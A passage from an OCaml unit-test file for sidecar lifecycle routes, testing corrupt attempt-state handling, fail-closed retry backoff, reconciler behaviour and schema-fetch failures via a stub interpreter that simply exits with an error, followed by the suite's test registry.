    let path = Routes.sidecar_attempt_path ~base_path "discord" in
    write_file
      path
      {|{"connector_id":"discord","generation":1,"attempt_id":"1:1","attempt_number":1,"last_attempt_result":"start_dispatched","next_retry_at":"not-an-iso-stamp","operator_next_action":"none","updated_at":"2026-01-01T00:00:00Z"}|};
    match Routes.read_attempt_record_result ~base_path "discord" with
    | Error msg ->
      check bool "mentions field" true (contains_substring msg "next_retry_at");
      check bool "mentions bad value" true (contains_substring msg "not-an-iso-stamp")
    | Ok None -> failf "corrupt persisted attempt state must not look absent"
    | Ok (Some _) -> failf "corrupt persisted attempt state should not decode")
;;

let test_status_json_surfaces_invalid_attempt_state () =
  with_temp_dir "sidecar-attempt-corrupt-status" (fun base_path ->
    let path = Routes.sidecar_attempt_path ~base_path "discord" in
    write_file
      path
      {|{"connector_id":"discord","generation":1,"attempt_id":"1:1","attempt_number":1,"last_attempt_result":"start_dispatched","next_retry_at":"not-an-iso-stamp","operator_next_action":"none","updated_at":"2026-01-01T00:00:00Z"}|};
    let json = Routes.read_status_json ~base_path "discord" in
    let open Yojson.Safe.Util in
    let lifecycle = json |> member "sidecar_lifecycle" in
    let error =
      match lifecycle |> member "attempt_read_error" with
      | `String msg -> msg
      | other -> failf "expected attempt_read_error string, got %s" (Yojson.Safe.to_string other)
    in
    check bool "mentions field" true (contains_substring error "next_retry_at");
    check bool "mentions bad value" true (contains_substring error "not-an-iso-stamp"))
;;

let test_retry_backoff_fail_closed_on_malformed_now () =
  let attempt = make_attempt ~next_retry_at:(Some "2026-01-01T00:00:30Z") in
  check
    bool
    "malformed now → fail-closed"
    false
    (Routes.retry_backoff_active ~now:"not-an-iso-stamp" attempt)
;;

let test_reconcile_invalid_attempt_time_noops_without_exception () =
  let process_calls = ref 0 in
  let desired : Routes.desired_record =
    { Routes.connector_id = "discord"
    ; desired_state = Routes.Desired_running
    ; generation = 3
    ; updated_by = "test"
    ; updated_at = "2026-04-20T00:00:00Z"
    }
  in
  let result =
    Routes.reconcile_desired_once
      ~now:"not-an-iso-stamp"
      ~next_retry_at:"2099-04-20T00:00:30Z"
      ~current_generation:3
      ~observed_state:Routes.Observed_unavailable
      ~start_process:(fun () -> incr process_calls)
      desired
  in
  check int "invalid attempt time suppresses process start" 0 !process_calls;
  check
    string
    "invalid time result"
    "noop:attempt_time_invalid"
    (Routes.reconcile_result_to_string result)
;;

(* ---- Fault-recovery gaps (untested subprocess failure paths) ----
   These tests pin the CURRENT behavior of the reconciler and schema
   fetcher under failure.  They do NOT assert the behavior is ideal;
   they prevent silent regression of the known gaps so that a future
   fix can be validated against a concrete baseline.

   Known gaps NOT covered here because the HTTP handlers are tightly
   coupled to Eio/HTTP request types:
   - handle_stop ignores run_argv_with_status exit code
   - handle_logs ignores run_argv_with_status exit code *)

let test_reconcile_start_process_exception_propagates () =
  let desired : Routes.desired_record =
    { Routes.connector_id = "discord"
    ; desired_state = Routes.Desired_running
    ; generation = 1
    ; updated_by = "test"
    ; updated_at = "2026-04-20T00:00:00Z"
    }
  in
  try
    ignore
      (Routes.reconcile_desired_once
         ~now:"2026-04-20T00:00:00Z"
         ~next_retry_at:"2099-04-20T00:00:30Z"
         ~current_generation:1
         ~observed_state:Routes.Observed_unavailable
         ~write_attempt:(fun _ -> Ok ())
         ~start_process:(fun () -> raise (Failure "process failed"))
         desired);
    failf "expected exception from start_process to propagate"
  with
  | Failure msg -> check string "exception propagates unchanged" "process failed" msg
;;

let with_schema_fail_sidecar f =
  with_temp_dir "sidecar-schema-fail" (fun base_path ->
    let sidecar_dir = Filename.concat base_path "sidecars/discord-bot" in
    (* [Routes.python_argv_for] looks for [.venv/bin/python] (dotted venv) before
         falling back to [uv run]. The fake interpreter must live at the exact
         path the production code probes, otherwise this test silently exercises
         the uv fallback (and depends on uv being installed). *)
    let python_bin = Filename.concat sidecar_dir ".venv/bin/python" in
    mkdir_p (Filename.dirname python_bin);
    (* Fake python that exits 1 immediately *)
    write_file python_bin "#!/bin/sh\nexit 1\n";
    Unix.chmod python_bin 0o755;
    Routes.reset_schema_cache ();
    f base_path)
;;

let test_fetch_schema_error_on_nonzero_exit () =
  with_schema_fail_sidecar (fun base_path ->
    match Routes.fetch_schema ~base_path "discord" with
    | Ok _ -> failf "expected Error when python exits non-zero"
    | Error msg ->
      check
        bool
        "error mentions schema_dump failure"
        true
        (contains_substring msg "schema_dump failed"))
;;

let test_schema_field_types_result_surfaces_fetch_error () =
  with_schema_fail_sidecar (fun base_path ->
    match Routes.schema_field_types_result ~base_path "discord" with
    | Error (Routes.Schema_fetch_error msg) ->
      check
        bool
        "error mentions schema_dump failure"
        true
        (contains_substring msg "schema_dump failed")
    | Error error -> fail (Routes.schema_field_types_error_to_string error)
    | Ok fields ->
      failf "expected schema field type fetch error, got %d field(s)" (List.length fields))
;;

let test_schema_field_types_facade_observes_fetch_error () =
  with_schema_fail_sidecar (fun base_path ->
    let error_kind = Routes.schema_field_types_error_kind (Routes.Schema_fetch_error "") in
    let before = schema_field_types_failure_metric error_kind in
    check int "legacy facade fields" 0
      (List.length (Routes.schema_field_types ~base_path "discord"));
    let after = schema_field_types_failure_metric error_kind in
    check (float 0.0001) "fetch error metric increments" (before +. 1.0) after)
;;

let () =
  run
    "sidecar_lifecycle_routes"
    [ ( "validate_name"
      , [ test_case "accepts every known id" `Quick test_validate_accepts_each_known_id
        ; test_case "rejects None" `Quick test_validate_rejects_none
        ; test_case "rejects unknown id" `Quick test_validate_rejects_unknown_id
        ; test_case "rejects shell meta" `Quick test_validate_rejects_shell_meta
        ; test_case "rejects path traversal" `Quick test_validate_rejects_path_traversal
        ] )
    ; ( "clamp_lines"
      , [ test_case "default when missing" `Quick test_clamp_lines_default_when_missing
        ; test_case "passes in range" `Quick test_clamp_lines_passes_in_range
        ; test_case "clamps below 1" `Quick test_clamp_lines_clamps_below_one
        ; test_case "clamps above 1000" `Quick test_clamp_lines_clamps_above_max
        ] )
    ; ( "sidecar_root_resolution"
      , [ test_case
            "explicit sidecar root wins"
            `Quick
            test_resolve_existing_sidecar_dir_prefers_explicit_sidecar_root
        ; test_case
            "project root fallback when base path misses sidecars"
            `Quick
            test_resolve_existing_sidecar_dir_falls_back_to_project_root
        ; test_case
            "runtime base path prefers explicit request scope"
            `Quick
            test_runtime_base_path_result_prefers_explicit_base_path
        ; test_case
            "runtime base path fails closed without request or env base"
            `Quick
            test_runtime_base_path_result_fails_without_base_path
        ; test_case
            "missing directory message includes setup hint"
            `Quick
            test_missing_sidecar_dir_message_mentions_sidecar_root_hint
        ; test_case
            "runtime base path follows resolver precedence"
            `Quick
            test_runtime_base_path_uses_resolver_precedence
        ; test_case
            "runtime base path anchors relative env base"
            `Quick
            test_runtime_base_path_anchors_relative_env_base
        ; test_case
            "status file falls back to project root candidate"
            `Quick
            test_status_file_prefers_existing_project_root_candidate
        ; test_case
            "today log falls back to project root candidate"
            `Quick
            test_today_log_file_falls_back_to_project_root_log
        ] )
    ; ( "invariants"
      , [ test_case "known_ids size = 4" `Quick test_known_ids_size_matches_dashboard ] )
    ; ( "start_plan"
      , [ test_case
            "detached argv contract"
            `Quick
            test_start_plan_matches_detached_contract
        ; test_case
            "preserves shell metacharacters as argv values"
            `Quick
            test_start_plan_preserves_shell_meta_as_argv_values
        ] )
    ; ( "desired_state"
      , [ test_case
            "desired store increments generation"
            `Quick
            test_desired_store_increments_generation
        ; test_case
            "malformed persisted desired → read error"
            `Quick
            test_read_desired_record_result_reports_semantic_corruption
        ; test_case
            "malformed persisted desired → status error"
            `Quick
            test_status_json_surfaces_invalid_desired_state
        ; test_case
            "malformed persisted desired blocks overwrite"
            `Quick
            test_write_desired_record_refuses_corrupt_prior_state
        ; test_case
            "stale generation reconcile does not start"
            `Quick
            test_reconcile_stale_generation_does_not_start
        ; test_case
            "running + unavailable starts once"
            `Quick
            test_reconcile_running_unavailable_starts_once
        ; test_case
            "attempt write failure does not start"
            `Quick
            test_reconcile_attempt_write_failure_does_not_start
        ; test_case
            "running + unavailable backs off repeated same-generation start"
            `Quick
            test_reconcile_running_unavailable_backoff_noops
        ; test_case "stopped desired no-ops" `Quick test_reconcile_stopped_noops
        ; test_case
            "status JSON includes lifecycle shape"
            `Quick
            test_status_json_includes_lifecycle_shape
        ; test_case
            "status JSON exposes dashboard provenance"
            `Quick
            test_status_json_exposes_dashboard_provenance
        ; test_case
            "malformed status file surfaces read error"
            `Quick
            test_status_json_surfaces_malformed_status_file
        ] )
    ; ( "config_write_helpers"
      , [ test_case "escape: quotes + backslash" `Quick test_escape_quotes_and_backslash
        ; test_case "escape: control chars" `Quick test_escape_control_chars
        ; test_case "render_value: each variant" `Quick test_render_value_quotes_strings
        ; test_case "render_toml: alpha-sort" `Quick test_render_toml_sorts_keys
        ; test_case
            "coerce: integer ok/err"
            `Quick
            test_coerce_integer_accepts_and_rejects
        ; test_case "coerce: boolean variants" `Quick test_coerce_boolean_accepts_variants
        ; test_case
            "coerce: oversized rejected"
            `Quick
            test_coerce_rejects_oversized_value
        ; test_case
            "parse declared type: known types"
            `Quick
            test_parse_declared_type_accepts_known_schema_types
        ; test_case
            "parse declared type: unknown types rejected"
            `Quick
            test_parse_declared_type_rejects_unknown_schema_types
        ; test_case
            "parse body pairs: scalars"
            `Quick
            test_parse_body_pairs_coerces_scalar_values
        ; test_case
            "parse body pairs: non-object"
            `Quick
            test_parse_body_pairs_rejects_non_object
        ; test_case
            "parse body pairs: invalid JSON"
            `Quick
            test_parse_body_pairs_rejects_invalid_json
        ; test_case
            "atomic write replaces content"
            `Quick
            test_atomic_write_file_replaces_content
        ] )
    ; ( "iso_format_invariants (#8930)"
      , [ test_case
            "isoish_now has fixed 20-char shape"
            `Quick
            test_isoish_now_fixed_shape
        ; test_case "isoish_at epoch round-trip" `Quick test_isoish_at_epoch_round_trip
        ; test_case
            "lexical compare matches chronological order"
            `Quick
            test_isoish_lexical_matches_chronological
        ] )
    ; ( "retry_backoff_active (#8930 phase 3)"
      , [ test_case
            "now before deadline → active"
            `Quick
            test_retry_backoff_active_before_deadline
        ; test_case
            "now after deadline → inactive"
            `Quick
            test_retry_backoff_inactive_after_deadline
        ; test_case
            "no deadline → inactive"
            `Quick
            test_retry_backoff_inactive_when_no_deadline
        ; test_case
            "malformed next_retry_at → rejected at boundary"
            `Quick
            test_attempt_record_of_json_rejects_malformed_next_retry_at
        ; test_case
            "malformed persisted attempt → read error"
            `Quick
            test_read_attempt_record_result_reports_semantic_corruption
        ; test_case
            "malformed persisted attempt → status error"
            `Quick
            test_status_json_surfaces_invalid_attempt_state
        ; test_case
            "malformed now → fail-closed"
            `Quick
            test_retry_backoff_fail_closed_on_malformed_now
        ; test_case
            "malformed reconcile time → noop"
            `Quick
            test_reconcile_invalid_attempt_time_noops_without_exception
        ] )
    ; ( "fault_recovery_gaps"
      , [ test_case
            "start_process exception propagates through reconcile"
            `Quick
            test_reconcile_start_process_exception_propagates
        ; test_case
            "fetch_schema returns Error on non-zero python exit"
            `Quick
            test_fetch_schema_error_on_nonzero_exit
        ; test_case
            "schema_field_types_result surfaces fetch error"
            `Quick
            test_schema_field_types_result_surfaces_fetch_error
        ; test_case
            "schema_field_types facade observes fetch error"
            `Quick
            test_schema_field_types_facade_observes_fetch_error
        ] )
    ]
;;
